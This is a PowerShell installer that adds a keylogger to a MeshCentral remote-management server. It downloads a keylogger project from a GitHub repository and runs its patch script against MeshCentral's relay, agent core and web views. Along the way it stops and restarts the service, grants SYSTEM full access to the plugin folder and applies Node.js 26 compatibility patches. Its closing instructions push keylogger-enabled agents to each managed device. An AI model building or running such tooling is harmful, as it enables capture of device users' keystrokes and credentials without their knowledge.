param(
    [string]$MeshCentralRoot = 'C:\Program Files\Open Source\MeshCentral',
    [string]$ServiceName = 'meshcentral.exe'
)

$ErrorActionPreference = 'Stop'

$package = Join-Path $MeshCentralRoot 'node_modules\meshcentral'
$data = Join-Path $MeshCentralRoot 'meshcentral-data'
$plugin = Join-Path $data 'plugins\mckeylog'
$node = (Get-Command node.exe -ErrorAction SilentlyContinue).Source
if ([string]::IsNullOrWhiteSpace($node)) {
    $node = 'C:\Program Files\nodejs\node.exe'
}

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [Security.Principal.WindowsPrincipal]::new($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Open PowerShell with Run as administrator, then run this installer again.'
}
if (-not (Test-Path -LiteralPath $package)) { throw "MeshCentral package not found: $package" }
if (-not (Test-Path -LiteralPath $node)) { throw "Node.js not found: $node" }

# ---------------------------------------------------------------------------
# Node.js >= 26 compatibility patches for the MeshCentral node_modules tree.
# On Node 26 the readable-stream internals changed (destroyed is backed by
# stream state, and streams are auto-destroyed right after 'end'), which
# hangs yauzl (fd-slicer) and can truncate the LAST file of a plugin zip
# (pluginHandler). All patches are idempotent and keep a .bak-mckeylog copy.
# They must be re-applied after any MeshCentral server upgrade.
# ---------------------------------------------------------------------------
function Apply-TextPatch {
    param([string]$File, [string]$Marker, [string[]]$Old, [string[]]$New)
    if (-not (Test-Path -LiteralPath $File)) {
        Write-Output "  (skip, not present: $($File | Split-Path -Parent | Split-Path -Leaf))"
        return
    }
    $content = [IO.File]::ReadAllText($File)
    if ($content.Contains($Marker)) {
        Write-Output "  (already patched: $([IO.Path]::GetFileName($File)))"
        return
    }
    $nl = if ($content.Contains("`r`n")) { "`r`n" } else { "`n" }
    $count = [regex]::Matches($content, [regex]::Escape(($Old -join $nl))).Count
    if ($count -ne 1) {
        Write-Output "  (warning: pattern found $count time(s) in $([IO.Path]::GetFileName($File)) - skipped; a MeshCentral upgrade may have changed it)"
        return
    }
    Copy-Item -LiteralPath $File -Destination ($File + '.bak-mckeylog') -Force
    $content = $content.Replace(($Old -join $nl), ($New -join $nl))
    [IO.File]::WriteAllText($File, $content, (New-Object System.Text.UTF8Encoding($false)))
    Write-Output "  patched: $([IO.Path]::GetFileName($File))"
}

function Invoke-NodeCompatPatches {
    param([string]$NodeModules, [string]$Package)
    Write-Output 'Applying Node.js >= 26 compatibility patches (idempotent)...'
    $fdSlicer = Join-Path $NodeModules 'fd-slicer\index.js'
    # 1a) fd-slicer: push(null) must happen before the destroyed flag is set,
    #     or the final partial chunk never drains and 'end' never fires.
    Apply-TextPatch -File $fdSlicer -Marker 'End the stream (push null) before any destroyed-flag' `
        -Old @('  if (toRead <= 0) {', '    self.destroyed = true;', '    self.push(null);', '    self.context.unref();', '    return;', '  }') `
        -New @('  if (toRead <= 0) {', '    // [mckeylog node26-compat] End the stream (push null) before any destroyed-flag', '    // work: on Node >= 26, stream.destroyed is backed by internal stream state,', '    // and setting it to true here makes later resume()/pause() calls no-ops,', "    // so the final partial chunk never drains and 'end' never fires (yauzl hang).", '    self.push(null);', '    self.context.unref();', '    return;', '  }')
    # 1b) fd-slicer: same fix for the bytesRead === 0 path.
    Apply-TextPatch -File $fdSlicer -Marker 'same as the toRead <= 0 path above' `
        -Old @('      } else if (bytesRead === 0) {', '        self.destroyed = true;', '        self.push(null);', '        self.context.unref();', '      } else {') `
        -New @('      } else if (bytesRead === 0) {', '        // [mckeylog node26-compat] same as the toRead <= 0 path above', '        self.push(null);', '        self.context.unref();', '      } else {')
    # 2) fd-slicer: Node 26 auto-destroys readable streams right after 'end';
    #     that post-end destroy is normal lifecycle and must stay silent.
    Apply-TextPatch -File $fdSlicer -Marker 'auto-destroys readable streams right' `
        -Old @('ReadStream.prototype.destroy = function(err) {', '  if (this.destroyed) return;', '  err = err || new Error("stream destroyed");', '  this.destroyed = true;', "  this.emit('error', err);", '  this.context.unref();', '};') `
        -New @('ReadStream.prototype.destroy = function(err) {', '  if (this.destroyed) return;', '  this.destroyed = true;', '  // [mckeylog node26-compat auto] Node >= 26 auto-destroys readable streams right', "  // after 'end'. That post-end destroy is normal lifecycle: keep it silent", '  // and skip the unref (the EOF path in _read already released the fd hold).', '  if (!err && this._readableState && this._readableState.ended) {', '    return;', '  }', '  err = err || new Error("stream destroyed");', "  this.emit('error', err);", '  this.context.unref();', '};')
    # 3) pluginHandler: advance to the next zip entry only after the file is
    #     fully written, or the last entry can come out empty.
    Apply-TextPatch -File (Join-Path $Package 'pluginHandler.js') -Marker 'mckeylog compat' `
        -Old @("                                            readStream.on('end', function () { zipfile.readEntry(); });", "                                            if (process.platform == 'win32') {", "                                                readStream.pipe(obj.fs.createWriteStream(filePath));", "                                            } else {", "                                                var fileMode = (entry.externalFileAttributes >> 16) & 0x0fff;", "                                                if( fileMode <= 0 ) fileMode = 0o644;", "                                                readStream.pipe(obj.fs.createWriteStream(filePath, { mode: fileMode }));", "                                            }") `
        -New @("                                            // [mckeylog compat] advance to the next entry only after the file is fully", "                                            // written: the source stream 'end' fires before the write stream's buffer", "                                            // flushes, which can leave the LAST entry in the zip empty.", "                                            if (process.platform == 'win32') {", "                                                var ws = obj.fs.createWriteStream(filePath);", "                                            } else {", "                                                var fileMode = (entry.externalFileAttributes >> 16) & 0x0fff;", "                                                if( fileMode <= 0 ) fileMode = 0o644;", "                                                var ws = obj.fs.createWriteStream(filePath, { mode: fileMode });", "                                            }", "                                            ws.on('finish', function () { zipfile.readEntry(); });", "                                            readStream.pipe(ws);")
    Write-Output 'Node.js compatibility patches done.'
}

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$work = Join-Path ([IO.Path]::GetTempPath()) ('mckeylog-' + $stamp)
$archive = Join-Path $work 'meshcentral-keylogger.zip'
$sourceRoot = Join-Path $work 'meshcentral-keylogger-main'
$backup = Join-Path (Join-Path $data 'mckeylog-backups') $stamp
$serviceWasRunning = $false
New-Item -ItemType Directory -Force -Path $work, $backup | Out-Null

try {
    Write-Output 'Downloading the current MeshCentral Keylogger project from GitHub...'
    Invoke-WebRequest -Uri 'https://github.com/og-debug447/meshcentral-keylogger/archive/refs/heads/main.zip' -OutFile $archive
    Expand-Archive -LiteralPath $archive -DestinationPath $work -Force
    if (-not (Test-Path -LiteralPath (Join-Path $sourceRoot 'scripts\patch_meshcentral.js'))) {
        throw 'The downloaded keylogger project is missing its patch script.'
    }

    $targets = @(
        @{ Source = (Join-Path $package 'meshrelay.js'); Destination = 'meshrelay.js' },
        @{ Source = (Join-Path $package 'agents\meshcore.js'); Destination = 'meshcore.js' },
        @{ Source = (Join-Path $package 'views\default.handlebars'); Destination = 'default.handlebars' },
        @{ Source = (Join-Path $package 'views\default3.handlebars'); Destination = 'default3.handlebars' }
    )
    foreach ($target in $targets) {
        if (-not (Test-Path -LiteralPath $target.Source)) { throw "MeshCentral file not found: $($target.Source)" }
        Copy-Item -LiteralPath $target.Source -Destination (Join-Path $backup $target.Destination)
    }

    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($null -ne $service -and $service.Status -ne 'Stopped') {
        Write-Output "Stopping $ServiceName while MeshCentral files are updated..."
        Stop-Service -Name $ServiceName -Force
        (Get-Service -Name $ServiceName).WaitForStatus('Stopped', [TimeSpan]::FromSeconds(45))
        $serviceWasRunning = $true
    }

    New-Item -ItemType Directory -Force -Path $plugin | Out-Null
    # A previous installer can leave plugin files with a SYSTEM-only ACL.
    # This installer is already running elevated, so grant the current
    # administrator access before replacing the old plugin tree.
    & icacls.exe $plugin /grant "$($identity.Name):(OI)(CI)(F)" /T /C | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "Could not update plugin permissions: $plugin" }
    # The MeshCentral server runs as SYSTEM and re-extracts plugin files from
    # GitHub whenever the admin Plugins page installs/updates a plugin. It must
    # be able to overwrite every file in the tree or the server crashes with an
    # unhandled EPERM stream error while enabling the plugin.
    & icacls.exe $plugin /grant 'NT AUTHORITY\SYSTEM:(OI)(CI)(F)' /T /C | Out-Null
    if ($LASTEXITCODE -ne 0) { throw 'Could not grant the MeshCentral service access to the plugin files' }
    Copy-Item -Path (Join-Path $sourceRoot '*') -Destination $plugin -Recurse -Force
    & $node (Join-Path $sourceRoot 'scripts\patch_meshcentral.js') $package
    if ($LASTEXITCODE -ne 0) { throw "MeshCentral patch exited with code $LASTEXITCODE" }
    Invoke-NodeCompatPatches -NodeModules (Join-Path $MeshCentralRoot 'node_modules') -Package $package

    if ($null -ne $service) {
        Write-Output "Starting $ServiceName..."
        Start-Service -Name $ServiceName
        (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
    }
    Write-Output 'Keylogger plugin installed and MeshCentral patched.'
    Write-Output 'Next steps:'
    Write-Output '  1. Open the MeshCentral admin console, go to Plugins and install "MeshCentral Keylogger" (or use the plugin URL from the project README).'
    Write-Output '  2. Run install-keylogger-agent.ps1 to publish the keylogger-enabled agent binaries.'
    Write-Output '  3. On each device, reinstall/update the agent, then hard-refresh PC Control with Ctrl+F5. The Keylogs tab appears on device pages.'
    Write-Output "Backup: $backup"
} catch {
    Write-Output "Installation failed. The original MeshCentral files are backed up at $backup"
    if ($serviceWasRunning) {
        try {
            $currentService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($null -ne $currentService -and $currentService.Status -eq 'Stopped') {
                Start-Service -Name $ServiceName
                (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
            }
        } catch { Write-Output "MeshCentral service recovery failed: $($_.Exception.Message)" }
    }
    throw
}
